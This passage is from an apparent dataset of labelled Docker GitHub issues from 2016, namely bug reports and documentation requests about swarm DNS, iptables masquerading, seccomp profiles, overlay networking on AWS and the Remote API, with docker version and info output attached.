resolve.\r\n\r\n\r\n**Describe the results you received:**\r\nWithin the container, the DNS doesn't work.  You can't ping www.google.com, but you can ping, for instance, 8.8.8.8\r\n\r\n**Describe the results you expected:**\r\nThe containers should have working DNS.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nI've hit this on AWS for Docker Beta, and a local docker-machine VirtualBox environment.  In the case of Virtualbox, I experimented with altering the virtualbox to 1.12.1/.2 as well as 3, but the issue remained and I can reliably recreate this from scratch.\r\n\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 21:44:32 2016\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 23:26:11 2016\r\n OS/Arch:      linux/amd64\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 53\r\n Running: 0\r\n Paused: 0\r\n Stopped: 53\r\nImages: 1\r\nServer Version: 1.12.3\r\nStorage Driver: aufs\r\n Root Dir: /mnt/sda1/var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 107\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: null overlay bridge host\r\nSwarm: active\r\n NodeID: caecow8uwead466cylqpa58m1\r\n Is Manager: true\r\n ClusterID: 2i7xeimsxlbbe3cndrwhzr5pv\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n Node Address: 192.168.99.100\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nSecurity Options: seccomp\r\nKernel Version: 4.4.27-boot2docker\r\nOperating System: Boot2Docker 1.12.3 (TCL 7.2); HEAD : 7fc7575 - Thu Oct 27 17:23:17 UTC 2016\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 2.937 GiB\r\nName: net-test-machine\r\nID: 2I6J:XEPY:H3MW:5EDI:ZODN:T4LD:MHY3:LCRW:A2WK:BXHN:P4JG:KIOJ\r\nDocker Root Dir: /mnt/sda1/var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): true\r\n File Descriptors: 239\r\n Goroutines: 429\r\n System Time: 2016-11-09T03:02:31.153116336Z\r\n EventsListeners: 0\r\nUsername: codadoc\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\n provider=virtualbox\r\nInsecure Registries:\r\n 127.0.0.0/8\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nI have docker-machine version 0.8.2, build e18a919\r\n\r\nI hit the issue also in AWS for Docker Beta 1.12.3, where it was prevalent, but more inconsistent.\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. http://10.7.0.94:2375/services?filters={\"id\":[\"<node-id>\"]}\r\n2. http://10.7.0.94:2375/services?filters={\"id\":[\"<service-id>\"]}\r\n3.\r\n\r\n**Describe the results you received:**\r\n1. [ ]\r\n2. Service filtered by id.\r\n\r\n**Describe the results you expected:**\r\n1. Array of services filtered by node id.\r\n2. [ ]\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nAPI Docs state  <node id> as a filter parameter whereas service method filters by <service id> instead.\r\nHow can I get the list of services running on a particular node or with instances running on a specific node?\r\n\r\n**Output of `docker version`:**\r\n\r\n\r\n```\r\nDocker v 1.12.3\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\n{\r\n  \"ID\": \"TZFE:3XXK:PYKN:NIYU:BEQF:YNPU:4LKC:WFFG:LJ52:4UGQ:WJXH:SWDS\",\r\n  \"Containers\": 4,\r\n  \"ContainersRunning\": 4,\r\n  \"ContainersPaused\": 0,\r\n  \"ContainersStopped\": 0,\r\n  \"Images\": 23,\r\n  \"Driver\": \"devicemapper\",\r\n  \"DriverStatus\": [\r\n    [\r\n      \"Pool Name\",\r\n      \"docker-253:0-752710-pool\"\r\n    ],\r\n    [\r\n      \"Pool Blocksize\",\r\n      \"65.54 kB\"\r\n    ],\r\n    [\r\n      \"Base Device Size\",\r\n      \"10.74 GB\"\r\n    ],\r\n    [\r\n      \"Backing Filesystem\",\r\n      \"xfs\"\r\n    ],\r\n    [\r\n      \"Data file\",\r\n      \"/dev/loop0\"\r\n    ],\r\n    [\r\n      \"Metadata file\",\r\n      \"/dev/loop1\"\r\n    ],\r\n    [\r\n      \"Data Space Used\",\r\n      \"7.089 GB\"\r\n    ],\r\n    [\r\n      \"Data Space Total\",\r\n      \"107.4 GB\"\r\n    ],\r\n    [\r\n      \"Data Space Available\",\r\n      \"100.3 GB\"\r\n    ],\r\n    [\r\n      \"Metadata Space Used\",\r\n      \"9.732 MB\"\r\n    ],\r\n    [\r\n      \"Metadata Space Total\",\r\n      \"2.147 GB\"\r\n    ],\r\n    [\r\n      \"Metadata Space Available\",\r\n      \"2.138 GB\"\r\n    ],\r\n    [\r\n      \"Thin Pool Minimum Free Space\",\r\n      \"10.74 GB\"\r\n    ],\r\n    [\r\n      \"Udev Sync Supported\",\r\n      \"true\"\r\n    ],\r\n    [\r\n      \"Deferred Removal Enabled\",\r\n      \"false\"\r\n    ],\r\n    [\r\n      \"Deferred Deletion Enabled\",\r\n      \"false\"\r\n    ],\r\n    [\r\n      \"Deferred Deleted Device Count\",\r\n      \"0\"\r\n    ],\r\n    [\r\n      \"Data loop file\",\r\n      \"/var/lib/docker/devicemapper/devicemapper/data\"\r\n    ],\r\n    [\r\n      \"Metadata loop file\",\r\n      \"/var/lib/docker/devicemapper/devicemapper/metadata\"\r\n    ],\r\n    [\r\n      \"Library Version\",\r\n      \"1.02.107-RHEL7 (2016-06-09)\"\r\n    ]\r\n  ],\r\n  \"SystemStatus\": null,\r\n  \"Plugins\": {\r\n    \"Volume\": [\r\n      \"local\"\r\n    ],\r\n    \"Network\": [\r\n      \"overlay\",\r\n      \"bridge\",\r\n      \"null\",\r\n      \"host\"\r\n    ],\r\n    \"Authorization\": null\r\n  },\r\n  \"MemoryLimit\": true,\r\n  \"SwapLimit\": true,\r\n  \"KernelMemory\": true,\r\n  \"CpuCfsPeriod\": true,\r\n  \"CpuCfsQuota\": true,\r\n  \"CPUShares\": true,\r\n  \"CPUSet\": true,\r\n  \"IPv4Forwarding\": true,\r\n  \"BridgeNfIptables\": true,\r\n  \"BridgeNfIp6tables\": false,\r\n  \"Debug\": false,\r\n  \"NFd\": 55,\r\n  \"OomKillDisable\": true,\r\n  \"NGoroutines\": 194,\r\n  \"SystemTime\": \"2016-11-08T16:46:49.153754781+01:00\",\r\n  \"ExecutionDriver\": \"\",\r\n  \"LoggingDriver\": \"json-file\",\r\n  \"CgroupDriver\": \"cgroupfs\",\r\n  \"NEventsListener\": 3,\r\n  \"KernelVersion\": \"3.10.0-327.36.3.el7.x86_64\",\r\n  \"OperatingSystem\": \"CentOS Linux 7 (Core)\",\r\n  \"OSType\": \"linux\",\r\n  \"Architecture\": \"x86_64\",\r\n  \"IndexServerAddress\": \"https://index.docker.io/v1/\",\r\n  \"RegistryConfig\": {\r\n    \"InsecureRegistryCIDRs\": [\r\n      \"127.0.0.0/8\"\r\n    ],\r\n    \"IndexConfigs\": {\r\n      \"docker.io\": {\r\n        \"Name\": \"docker.io\",\r\n        \"Mirrors\": null,\r\n        \"Secure\": true,\r\n        \"Official\": true\r\n      }\r\n    },\r\n    \"Mirrors\": null\r\n  },\r\n  \"NCPU\": 4,\r\n  \"MemTotal\": 8118247424,\r\n  \"DockerRootDir\": \"/var/lib/docker\",\r\n  \"HttpProxy\": \"\",\r\n  \"HttpsProxy\": \"\",\r\n  \"NoProxy\": \"\",\r\n  \"Name\": \"master\",\r\n  \"Labels\": null,\r\n  \"ExperimentalBuild\": false,\r\n  \"ServerVersion\": \"1.12.3\",\r\n  \"ClusterStore\": \"\",\r\n  \"ClusterAdvertise\": \"\",\r\n  \"SecurityOptions\": [\r\n    \"seccomp\"\r\n  ],\r\n  \"Runtimes\": {\r\n    \"runc\": {\r\n      \"path\": \"docker-runc\"\r\n    }\r\n  },\r\n  \"DefaultRuntime\": \"runc\",\r\n  \"Swarm\": {\r\n    \"NodeID\": \"6hftixtprlhop5addjmo7qnxe\",\r\n    \"NodeAddr\": \"10.7.0.94\",\r\n    \"LocalNodeState\": \"active\",\r\n    \"ControlAvailable\": true,\r\n    \"Error\": \"\",\r\n    \"RemoteManagers\": [\r\n      {\r\n        \"NodeID\": \"6hftixtprlhop5addjmo7qnxe\",\r\n        \"Addr\": \"10.7.0.94:2377\"\r\n      }\r\n    ],\r\n    \"Nodes\": 2,\r\n    \"Managers\": 1,\r\n    \"Cluster\": {\r\n      \"ID\": \"5lp9rqb6l7my0ek9jg21cwkf9\",\r\n      \"Version\": {\r\n        \"Index\": 819\r\n      },\r\n      \"CreatedAt\": \"2016-11-03T12:50:34.101987364Z\",\r\n      \"UpdatedAt\": \"2016-11-08T12:50:34.44261306Z\",\r\n      \"Spec\": {\r\n        \"Name\": \"default\",\r\n        \"Orchestration\": {\r\n          \"TaskHistoryRetentionLimit\": 5\r\n        },\r\n        \"Raft\": {\r\n          \"SnapshotInterval\": 10000,\r\n          \"LogEntriesForSlowFollowers\": 500,\r\n          \"HeartbeatTick\": 1,\r\n          \"ElectionTick\": 3\r\n        },\r\n        \"Dispatcher\": {\r\n          \"HeartbeatPeriod\": 5000000000\r\n        },\r\n        \"CAConfig\": {\r\n          \"NodeCertExpiry\": 7776000000000000\r\n        },\r\n        \"TaskDefaults\": {}\r\n      }\r\n    }\r\n  },\r\n  \"LiveRestoreEnabled\": false\r\n}\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nPhysical"},{"labels":["documentation",null,null,null],"text":"---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\n**Description**\r\nWhen a new user defined docker bridge network is created and the docker daemon has `iptables=false` and `ip-masq=true` the nat masquerade rules are not created for the user defined bridge network. This causes machines attached to this network to have no external access outside of the docker host.\r\n\r\n***Use-Case**\r\nWe are running several containers on a single docker host and don't want Docker to automatically create iptables allow rules for all of the exposed ports for security reasons. We then manage our own iptables rules via Puppet.  Not sure if this is a bug but at the very least the documentation [https://docs.docker.com/engine/reference/commandline/dockerd/#/miscellaneous-options](url) is lacking any details when setting the `iptables` and `ip-masq` settings other then there explicit purpose. When setting `iptables` to false and `ip-masq` to true should Docker still create the masquerade rules related to the containers? I even went ahead and set `com.docker.network.bridge.enable_ip_masquerade=true` and the rules are not created. \r\n\r\n**Steps to reproduce the issue:**\r\n1. Setup a Ubuntu 16.04 Server 64 bit with docker 1.12.3. For this example this server has an IP address on eth0 of 192.168.100.40 and the default gateway is 192.168.100.1. The default gateway accepts pings.\r\n2. Set your Docker daemon with the following flags: `--ip-forward=true --iptables=false --ip-masq=true`\r\n3. Create a new Docker bridge network: `docker network create --driver bridge --gateway=192.168.10.1 --subnet=192.168.10.0/24 --opt \"com.docker.network.bridge.name\"=\"example\" example `\r\n4. Attach and run any container image so you can issue ping commands to the network created above: `docker run -itd --network=example busybox`\r\n5. Exec into the container and attempt to ping 192.168.100.1. \r\n\r\n**Describe the results you received:**\r\nA tcpdump on the server shows packets leaving the host to the correct destination and source but the masquerade iptables nat rules are never created for the new bridge network thus ipables doesnt know were to send the original packets. When I delete the network, turn on `iptables=true`, and recreate the network the correct masquerade rules are created along with all of the rules for the exposed ports which we dont want. \r\n\r\n**Describe the results you expected:**\r\nSince `ip-masq=true` I was expecting the nat masquerading rules to still be created and the exposed ports to not be created in the DOCKER chain. I didnt see anything in the documentation that mentioned the nat rules not being created with the `--iptables=false --ip-masq=true` settings in place. It would be good if the official documentation had more details in how docker is interacting with iptables on the host. At the very least if you disable iptables nat masquerade rules will not be created event though the settings are in place at the daemon and network level.\r\n\r\nI have a workaround of adding the nat masquerade rules via puppet but is this the expected behavior? \r\n\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 22:01:48 2016\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 22:01:48 2016\r\n OS/Arch:      linux/amd64\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 15\r\n Running: 15\r\n Paused: 0\r\n Stopped: 0\r\nImages: 41\r\nServer Version: 1.12.3\r\nStorage Driver: aufs\r\n Root Dir: /opt/data/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 189\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: host null bridge overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nSecurity Options: apparmor seccomp\r\nKernel Version: 4.4.0-45-generic\r\nOperating System: Ubuntu 16.04.1 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 8\r\nTotal Memory: 7.796 GiB\r\nName: server..com\r\nID: XURH:HQYH:VWQ6:25GJ:DB2C:4RVF:B2KL:LJI3:GJ2W:ZYV7:C4T6:Z5LY\r\nDocker Root Dir: /opt/data\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: bridge-nf-call-iptables is disabled\r\nWARNING: bridge-nf-call-ip6tables is disabled\r\nInsecure Registries:\r\n 127.0.0.0/8\r\n\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n"},{"labels":["documentation",null],"text":"https://github.com/docker/docker/pull/27995 added templating features for swarm mode, but they were not documented yet.\r\n\r\nThe docs should be updated to document the templating, and include examples on how / when to use them"},{"labels":["documentation",null,null,null],"text":"---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\n**Description**\r\nI followed Docker Seccomp usage guide [here](https://docs.docker.com/engine/security/seccomp/) and used [default profile](https://raw.githubusercontent.com/docker/docker/master/profiles/seccomp/default.json), and got error:\r\n`docker: Error response from daemon: invalid header field value \"oci runtime error: container_linux.go:247: starting container process caused \\\"empty string is not a valid syscall\\\"\\n\".\r\n`\r\n\r\n**Steps to reproduce the issue:**\r\n(Essentially just follow the guide in above link)\r\n1. Download default seccomp profile json from [here](https://raw.githubusercontent.com/docker/docker/master/profiles/seccomp/default.json)\r\n2. docker run --rm -it --security-opt seccomp=/path/to/seccomp/profile.json hello-world\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 22:01:48 2016\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      1.12.3\r\n API version:  1.24\r\n Go version:   go1.6.3\r\n Git commit:   6b644ec\r\n Built:        Wed Oct 26 22:01:48 2016\r\n OS/Arch:      linux/amd64\r\n```\r\n\r\n**Output of `docker info`:**\r\n```\r\nContainers: 0\r\n Running: 0\r\n Paused: 0\r\n Stopped: 0\r\nImages: 2\r\nServer Version: 1.12.3\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 2\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: null host bridge overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nSecurity Options: apparmor seccomp\r\nKernel Version: 4.4.0-31-generic\r\nOperating System: Ubuntu 16.04.1 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 7.797 GiB\r\nName: myserver\r\nID: RZN7:A4OM:DVGC:3OUT:GEBY:ANAX:3DGF:BE7G:FZ4L:H6O2:4XG7:DGDF\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nWARNING: No swap limit support\r\nInsecure Registries:\r\n 127.0.0.0/8\r\n```\r\n\r\nIs this json format outdated? Where can I find a proper guide to write correct one? Thanks in advance!"},{"labels":["documentation"],"text":"per https://github.com/docker/docker/pull/25820#issuecomment-256800737, we need to add documentation for the new metrics API, and probably some examples in other parts of the documentation to show how it's used.\n\nopening this issue for tracking, so that we unblock the PR that implements the feature\n\n/cc @mstanleyjones @crosbymichael  - assigning you both so that we don't forget :smile:\n"},{"labels":["documentation",null,null,null],"text":"---\n## BUG REPORT INFORMATION\n\nServices on overlay network can not communicate with services on other nodes in the same overlay network unless \"All traffic\" is open in an AWS security group. Opening only the documented required ports; `2377`, `4789`, and `7946` on UDP and TCP are insufficient. Even opening all TCP and UDP ports does not work, only selecting \"All traffic\" does.\n\n**Steps to reproduce the issue:**\nOn AWS, inside a VPC:\n1. Create a swarm with `swarm init`, and add other nodes via the supplied `join` command\n2. Create an overlay network, e.g. `docker network create --driver overlay --subnet 10.0.9.0/24 --opt encrypted newnet`\n3. Add a service (service1) to to one node (node1) in the cluster, then add another service (service2) to a different node (node2) in the cluster\n4. Open ports `2377`, `4789`, and `7946` on UDP and TCP in the relevant AWS security group\n4. From inside the service2 container, try to access a port in service1 from service2. For example, if service1 is MySQL, try `telnet service1 3306` from service2\n\n**Describe the results you received:**\nNo access to service1 ports from service2. Only selecting to open \"All traffic\" in the security group works (not even \"All TCP\" and \"All UDP\").\n\n**Describe the results you expected:**\nBe able to reach service1 by only opening the ports required by Docker Swarm (above).\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\nThe strange part is that even selecting \"All TCP\" and \"All UDP\" does not work, only \"All traffic\". So what needs to be open that's not TCP or UDP?\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.2\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   bb80604\n Built:        Tue Oct 11 18:29:41 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.2\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   bb80604\n Built:        Tue Oct 11 18:29:41 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 0\n Running: 0\n Paused: 0\n Stopped: 0\nImages: 0\nServer Version: 1.12.2\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 0\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: host null bridge overlay\nSwarm: active\n NodeID: f43qckhb6hifw95hki6ihzbdt\n Is Manager: true\n ClusterID: 3ae1kkzosksoqvqgz6kclguhm\n Managers: 1\n Nodes: 3\n Orchestration:\n  Task History Retention Limit: 5\n Raft:\n  Snapshot Interval: 10000\n  Heartbeat Tick: 1\n  Election Tick: 3\n Dispatcher:\n  Heartbeat Period: 5 seconds\n CA Configuration:\n  Expiry Duration: 3 months\n Node Address: 10.0.11.215\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: apparmor seccomp\nKernel Version: 4.4.0-43-generic\nOperating System: Ubuntu 16.04.1 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 1\nTotal Memory: 1.952 GiB\nName: ip-10-0-11-215\nID: 6LVV:2FUY:E2TD:DKIR:LFAX:3HF6:6ZZI:65CM:F7YY:CQ2X:IVJO:F23E\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nLabels:\n type=master\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nRunning in AWS inside a VPC on in it's private subnet.\n"},{"labels":["documentation",null,null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Description**\n\nI have docker engine running in swarm mode with 4 nodes in the swarm cluster\n\n**Steps to reproduce the issue:**\n1. I run the command to start a docker service using an image stored in the dockerhub private repo.\nsudo docker service create --name serviceName  --network myNetwork --publish 8761:8761 orgName/imageName:version\n\n**Describe the results you received:**\n1. It seems that if the image does not exist in the local node where the service is scheduled to run, docker does not automatically pull the image from the private repo and the service fails to start\n2. However if I manually pull the image in all of the nodes in the cluster and then start the service, it seems to work. \n\n**Describe the results you expected:**\n1. I expected docker to automatically pull the image from the private repo hosted in the hub. To make sure that there are no connectivity issues I logged into the private repo using docker login in each of the 4 nodes in the cluster to make sure that the credentials to be used to connect to the repo are stored locally in the json file. Is this how its supposed to work? Should it not automatically pull from hub if the image is not available locally? Im I missing something?\n\nAdditional information you deem important (e.g. issue happens only occasionally):**\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   23cf638\n Built:\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   23cf638\n Built:\n OS/Arch:      linux/amd64\n\n\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 1\n Running: 0\n Paused: 0\n Stopped: 1\nImages: 201\nServer Version: 1.12.1\nStorage Driver: devicemapper\n Pool Name: docker-253:0-204218855-pool\n Pool Blocksize: 65.54 kB\n Base Device Size: 10.74 GB\n Backing Filesystem: xfs\n Data file: /dev/loop0\n Metadata file: /dev/loop1\n Data Space Used: 4.401 GB\n Data Space Total: 107.4 GB\n Data Space Available: 30.95 GB\n Metadata Space Used: 7.598 MB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.14 GB\n Thin Pool Minimum Free Space: 10.74 GB\n Udev Sync Supported: true\n Deferred Removal Enabled: false\n Deferred Deletion Enabled: false\n Deferred Deleted Device Count: 0\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\n WARNING: Usage of loopback devices is strongly discouraged for production use. Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\n Library Version: 1.02.107-RHEL7 (2016-06-09)\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge host null overlay\nSwarm: active\n NodeID: b11gagg35v2tojxnqemze6ey6\n Is Manager: true\n ClusterID: 7f9kda0i54yj0jl8js0vt84u5\n Managers: 3\n Nodes: 4\n Orchestration:\n  Task History Retention Limit: 5\n Raft:\n  Snapshot Interval: 10000\n  Heartbeat Tick: 1\n  Election Tick: 3\n Dispatcher:\n  Heartbeat Period: 5 seconds\n CA Configuration:\n  Expiry Duration: 3 months\n Node Address: 10.1.2.56\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: seccomp\nKernel Version: 3.10.0-327.28.2.el7.x86_64\nOperating System: Red Hat Enterprise Linux Server 7.2 (Maipo)\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 47.01 GiB\nName: cmcmdmz101\nID: N6XG:EQOG:FPUM:GYCY:HXHQ:DOVU:AHFM:TFBB:4GM6:WKC3:QCN2:6RLP\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nUsername: cmcdocker\nRegistry: https://index.docker.io/v1/\nWARNING: bridge-nf-call-ip6tables is disabled\nInsecure Registries:\n 127.0.0.0/8\n\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n"},{"labels":["documentation",null],"text":"Docker daemon can be started with MountFlags set to private, slave or shared. systemd makes shared as the default. Although this works for most users, there are some users that run into issues with mounts depending on their use case and MountFlags setting.\n\nCreate a document explaining the side effects of daemon MountFlags especially on: \n1. volumes exposed by plugins\n2. volumes exposed by local drivers and mounting a host directory. \n\ncc @cpuguy83 \n"},{"labels":[null,"documentation",null,null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Description**\nWhen I ran the \"info\" path in the Remote API v1.24 I got a lot more fields then the documentation said, these are:\n\nPlugins > Authorization\nCPUShares\nCPUSet\nBridgeNfIptables\nBridgeNfIp6tables\nExecutionDriver\nLoggingDriver\nRegistryConfig > Mirrors??? (the IndexConfigs have array of Mirrors but the RegistryConfig itself has also Mirrors, maybe a bug?)\nClusterAdvertise\nRuntimes\nDefaultRuntime\nSwarm (has lots of things in it)\nLiveRestoreEnabled\n\nI attach the raw response json I got:\n[info.txt](https://github.com/docker/docker/files/512218/info.txt)\n\n**Steps to reproduce the issue:**\n1. run \"/info\" on the remote api v1.24\n2. check the response JSON and compare to docs\n3.\n\n**Describe the results you received:**\nLots of more fields then documentation has\n\n**Describe the results you expected:**\nDocumentation of all fields\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.7\n Git commit:   23cf638\n Built:        Fri Aug 19 02:03:02 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.1\n API version:  1.24\n Go version:   go1.7\n Git commit:   23cf638\n Built:        Fri Aug 19 02:03:02 2016\n OS/Arch:      linux/amd64\n\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 1\n Running: 0\n Paused: 0\n Stopped: 1\nImages: 6\nServer Version: 1.12.1\nStorage Driver: devicemapper\n Pool Name: docker-253:1-10223820-pool\n Pool Blocksize: 65.54 kB\n Base Device Size: 10.74 GB\n Backing Filesystem: xfs\n Data file: /dev/loop0\n Metadata file: /dev/loop1\n Data Space Used: 664.9 MB\n Data Space Total: 107.4 GB\n Data Space Available: 106.7 GB\n Metadata Space Used: 1.389 MB\n Metadata Space Total: 2.147 GB\n Metadata Space Available: 2.146 GB\n Thin Pool Minimum Free Space: 10.74 GB\n Udev Sync Supported: true\n Deferred Removal Enabled: false\n Deferred Deletion Enabled: false\n Deferred Deleted Device Count: 0\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\n WARNING: Usage of loopback devices is strongly discouraged for production use. Use `--storage-opt dm.thinpooldev` to specify a custom block storage device.\n Metadata loop file: /var/lib/docker/devicemapper/devicemapper/metadata\n Library Version: 1.02.135 (2016-09-26)\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: overlay null host bridge\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: seccomp\nKernel Version: 4.7.5-1-ARCH\nOperating System: Arch Linux\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 23.49 GiB\nName: karl_rog\nID: IOCD:Y7FK:RDB6:43I7:QLCF:OBP5:LKJR:QLYD:NC6U:V7GA:ROQA:TCVE\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nInsecure Registries:\n codeslasher.se:5000\n 127.0.0.0/8\n```\n\n**Additional environment details 